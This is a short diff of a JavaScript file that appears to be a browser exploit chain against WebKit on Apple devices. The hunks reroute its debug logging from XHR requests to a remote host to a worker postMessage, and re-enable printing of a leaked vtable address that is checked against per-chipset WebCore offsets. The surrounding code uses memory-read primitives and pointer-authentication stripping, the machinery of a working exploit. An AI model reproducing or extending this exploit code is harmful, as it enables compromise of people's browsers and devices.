@@ -16,20 +16,24 @@ function sleep(ms) {
 let logStart = new Date().getTime();
 let logEntryID = 0;
 function print(x, reportError = false, dumphex = false) {
-    let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
-    if (!SERVER_LOG && !reportError) return;
-    let obj = {
-        id: logEntryID++,
-        text: out,
-    }
-    if (dumphex) {
-        obj.hex = 1
-        obj.text = x
-    }
-    let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&')
-    const xhr = new XMLHttpRequest();
-    xhr.open("GET", host + "/log.html?" + req , false);
-    xhr.send(null);
+    self.postMessage({
+        type: 'log',
+        text: x
+    });
+    // let out = ('[' + (new Date().getTime() - logStart) + 'ms] ').padEnd(10) + x;
+    // if (!SERVER_LOG && !reportError) return;
+    // let obj = {
+    //     id: logEntryID++,
+    //     text: out,
+    // }
+    // if (dumphex) {
+    //     obj.hex = 1
+    //     obj.text = x
+    // }
+    // let req = Object.entries(obj).map(([k, v]) => `${encodeURIComponent(k)}=${encodeURIComponent(v)}`).join('&')
+    // const xhr = new XMLHttpRequest();
+    // xhr.open("GET", host + "/log.html?" + req , false);
+    // xhr.send(null);
 }
   function getJS(fname,method = 'POST') 
   {
@@ -9324,7 +9328,7 @@ const device_chipset = {
                   continue;
 
               const vtable = read64(scriptExecutionContext);
-              //print(`vtable: ${vtable.noPAC().hex()}    offset:${offsets.WebCore__DedicatedWorkerGlobalScope_vtable.hex()}`);
+              print(`vtable: ${vtable.noPAC().hex()}    offset:${offsets.WebCore__DedicatedWorkerGlobalScope_vtable.hex()}`);
               if (vtable.noPAC() != offsets.WebCore__DedicatedWorkerGlobalScope_vtable)
                   continue;
 
